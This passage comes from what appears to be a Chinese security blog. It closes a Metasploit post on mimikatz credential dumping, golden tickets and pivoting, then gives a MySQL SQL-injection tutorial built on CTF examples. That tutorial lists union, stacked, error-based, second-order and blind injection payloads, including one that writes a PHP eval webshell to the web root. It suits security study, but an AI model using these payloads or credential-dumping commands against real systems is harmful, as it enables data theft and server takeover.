class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure><h5 id="调用mimikatz"><a href="#调用mimikatz" class="headerlink" title="调用mimikatz"></a>调用mimikatz</h5><blockquote><p>在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatz命令</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地6666端口</span></span><br></pre></td></tr></table></figure><h2 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24 <span class="comment"># 为当前sesison添加路由</span></span><br><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy <span class="comment"># socks5代理</span></span><br><span class="line"><span class="built_in">set</span> SRVHOST 127.0.0.1</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">配置proxychains使用该socks5代理</span><br></pre></td></tr></table></figure><h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_ms17_010 <span class="comment"># 扫描模块</span></span><br><span class="line">search exploit ms17_010 <span class="comment"># 查找exp</span></span><br></pre></td></tr></table></figure><h1 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h1><p><a href="https://tttang.com/archive/1432/">MSF渗透常用操作指南 - 跳跳糖 (tttang.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入详解--Mysql</title>
      <link href="/2023/06/26/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/06/26/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Sql注入漏洞是指服务器在处理Sql语句时<strong>错误地拼接用户提交的参数</strong>，<strong>打破了原有的Sql执行逻辑</strong>，导致攻击者可部分或完全<strong>掌握Sql语句执行效果</strong>的一类安全问题。</p><p>简单的例子</p><p>假设后端Sql代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>用户提交</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>拼接后的sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p><code>1&#39;</code>将第一个<code>&#39;</code>闭合，<code>#</code>将第二个<code>&#39;</code>注释掉，所以要进行注入，只需要将<code>and 1=1</code>部分替换为其他sql语句即可。</p><blockquote><p>其实分析<code>sqlmap</code>的注入也是如此，注入语句由<code>prefix</code>，<code>payload</code>和<code>suffix</code>组成</p></blockquote><p>图来源<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ul><li><p>获得数据库中的敏感信息，如手机号，身份证，邮箱，家庭地址等</p></li><li><p>获得网站后台账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">万能密码？（这年头还有吗🤔，还是有的。。）</span><br><span class="line">拿到密码，通常需要逆向解密或者彩虹表破解</span><br><span class="line">通过sql语句创建后台账号                    </span><br></pre></td></tr></table></figure></li><li><p>任意读取文件</p></li><li><p>Getshell</p></li><li><p>提权</p></li></ul><h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><p><strong>一切与数据库有交互的地方</strong>都可能是<strong>注入点</strong>，取决于后端从HTTP请求报文中提取了什么数据并拼接到sql语句中</p><p><strong>是否存在sql注入</strong></p><p>判断闭合类型，通常使用报错，布尔，延时，数学运算等手法来检测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">\</span><br><span class="line">+1，-1</span><br><span class="line">报错函数</span><br><span class="line">延时函数</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_39997096/article/details/109764488">实战中SQL注入最容易出现的地方_只有选择框和日期框,会出现sql注入情况吗-CSDN博客</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h3 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h3><blockquote><p>Web站点和数据库不在同一个主机上，所以不能通过数据库对Web站点进行读写操作</p></blockquote><p><strong>攻击手法</strong></p><ul><li>读取账密，转到web服务器上打</li><li>信息收集，数据库服务器是否在内网中</li></ul><p><strong>站库分离的判断方法</strong></p><ul><li><p>通用方法</p><p>读取配置文件，判断IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //服务端主机名称 </span><br><span class="line">select * from information_schema.PROCESSLIST; //客户端主机名称和端口</span><br></pre></td></tr></table></figure><blockquote><p>Windows连接格式：主机名:Port</p><p>Linux连接格式：IP:Port</p><p>本地连接格式：localhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user();</span><br></pre></td></tr></table></figure><blockquote><p>如果不是localhost，大概率是站库分离。</p></blockquote><p>  <img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h3 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h3><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h3 id="各种信息"><a href="#各种信息" class="headerlink" title="各种信息"></a>各种信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_priv为空时返回0,不为空时返回其值</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3，debian-linux-gnu，x86_64，Debian buildd-unstable</span><br><span class="line">kali，3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/，/usr/lib/mysql/plugin/，/tmp，/usr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 得到后端执行的sql语句</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h2 id="Mysql攻击手法"><a href="#Mysql攻击手法" class="headerlink" title="Mysql攻击手法"></a>Mysql攻击手法</h2><h3 id="admin登入"><a href="#admin登入" class="headerlink" title="admin登入"></a>admin登入</h3><ul><li><p>万能密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过布尔运算让where恒为真</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>注册覆盖</p><blockquote><p>admin (有个空格)或者 (有个空格)admin</p><p>原理：用户名字段长度&gt;5，所以可以添加空格，而sql语句执行时会将空格忽略。</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>联合查询构造临时用户</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>sql语句为<code>select</code>,页面有回显查询结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>先判断表中的列数</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> x</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null.....</span><br></pre></td></tr></table></figure><p>这里使用null是因为需要匹配数据格式，而null是可以匹配任意数据格式的</p><p><strong>再判断哪一列是输出点</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个位置输出不同的值来判断</span><br></pre></td></tr></table></figure><p><strong>最后进行注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">联合查询，获取库名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">联合查询，获取表名 </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;已知表名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段值</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(字段1，字段2...) from 已知表名#</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>因为后端查询语句可能只拿第一行查询结果如<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>，所以需要构造一个不存在的值如-1，使得联合查询的结果成为第一行；</p><p>要查的表的名称(这个表是不是在现在使用的数据库中，没有的话表名&#x3D;数据库.表名)</p></blockquote><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><blockquote><p>后端使用的查询函数为<code>mysqli_multi_query()</code> ，支持多条语句查询</p><p>而不是<code>mysqli_query()</code> ，仅支持一条语句查询</p></blockquote><h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><ul><li><p>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎的影响</p></li><li><p>无回显：在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略</p><p><strong>解决方法</strong>：可以通过先将内容插入到数据库中，然后再通过查询查出来</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sql语句;--+</span></span><br></pre></td></tr></table></figure><p>可以任意执行sql语句，危害很大</p><h6 id="配合handle绕过关键字"><a href="#配合handle绕过关键字" class="headerlink" title="配合handle绕过关键字"></a>配合handle绕过关键字</h6><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler 表名  open ; handler 表名 read first; #打开表；读取第一条数据</span><br><span class="line">handler 表名 read next;#与上一条语句一起用，读取下一条即第二条数据</span><br></pre></td></tr></table></figure><h6 id="配合预编译语句绕过"><a href="#配合预编译语句绕过" class="headerlink" title="配合预编译语句绕过"></a>配合预编译语句绕过</h6><p>使用格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //存储表名</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //预定义SQL语句</span><br><span class="line"></span><br><span class="line">execute query;  //执行预定义SQL语句</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>转换脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><strong>使用<code>mysql_error()</code>函数，可以返回上一个Mysql操作产生的文本错误信息。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h5><p>最常用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpat语法错误，报错信息是有长度限制的，最大长度限制32位,配合substr()等截取字符串函数使用</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>其他<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQL报错注入 </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原型：</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">爆库:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">爆表：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;已知库名&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆列名：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆字段值</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h3 id="二次注入–存储型注入"><a href="#二次注入–存储型注入" class="headerlink" title="二次注入–存储型注入"></a>二次注入–存储型注入</h3><p><strong>原理</strong></p><p><img src="/../images/1.png" alt="ctf1"></p><p>常见转义函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>以<code>sql-labs Less-24</code>为例</p><p>创建用户</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>使用不恰当的函数<code>mysql_escape_string</code>，功能为在 MySQL 中具有特殊含义的字符（如单引号、双引号、反斜杠和空字节）前添加反斜杠字符。所以脏数据还是进入到了数据库中。</p><p>修改密码处</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>直接将脏数据取出并拼接到sql语句中，造成了sql注入。</p><p><strong>常见场景</strong></p><p>将保存的脏数据从数据库中取出，再次进行sql操作的场景。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改密码，修改订单等修改已保存信息的地方</span><br><span class="line">注册用户名处</span><br></pre></td></tr></table></figure><p><strong>例题</strong></p><p>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#可控变量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#将$_POST[&quot;address&quot;]保存到数据库中</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$row保存sql语句查询结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#调用了查询结果</span></span><br></pre></td></tr></table></figure><p>分析上面两条语句，对可控参数address只进行了转义处理，就保存到数据库中。</p><p>并且在update中引用了<code>$row[&#39;address&#39;]</code>，所以在这里存在二次注入。</p><p>可以看到列名为old_address，在进行修改时，会将旧地址保存下来，所以我们只要在第一次修改时，在address处注入恶意代码，第二次修改查询旧地址时就会执行恶意代码。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h3 id="盲注–无回显注入"><a href="#盲注–无回显注入" class="headerlink" title="盲注–无回显注入"></a>盲注–无回显注入</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>页面无数据回显，但是有两种返回状态，poc如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=子查询 --+  </span><br><span class="line"># 子查询=字符串截取+比较</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">逻辑连接符</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">或</td><td align="center">or ，||</td></tr><tr><td align="center">异或</td><td align="center">xor，^</td></tr><tr><td align="center">按位与&#x2F;或</td><td align="center">&amp;，|</td></tr></tbody></table><p>字符串截取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 从start位置开始,截取len个字符</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># 从左/右截取len个字符</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>因为大小写不敏感，所以要用<code>binary</code></p><p>BINARY将16进制转化为字符串</p></blockquote><p>语法</p><table><thead><tr><th align="center">like</th><th align="center">正则</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>时间盲注就是<strong>在布尔盲注上加了延迟时间函数sleep()</strong>,用在True和False回显难以区分时,通过页面的响应时间来判断布尔逻辑的正确与否。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(布尔,A,B)与三目运算符逻辑一样,加上sleep函数</span><br><span class="line"></span><br><span class="line">sleep(if(布尔,A,B))布尔正确,延迟A秒,布尔错误,延迟B秒</span><br><span class="line"></span><br><span class="line">或者 if(布尔,1,sleep(x))布尔正确,无延迟,布尔错误,延迟x秒</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312232840696-1696561612774.png" alt="image-20230312232840696"></p><p><strong>其他能造成延时效果的语句</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过执行多次命令形成延时</span><br><span class="line">benchmark(执行次数,sql语句)</span><br><span class="line"></span><br><span class="line"># 查询一些数据量比较大的表做笛卡尔集运算，导致查询缓慢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h3 id="DNS外带注入"><a href="#DNS外带注入" class="headerlink" title="DNS外带注入"></a>DNS外带注入</h3><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><ol><li><p>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；</p></li><li><p>windows下存在<code>UNC路径</code></p><blockquote><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 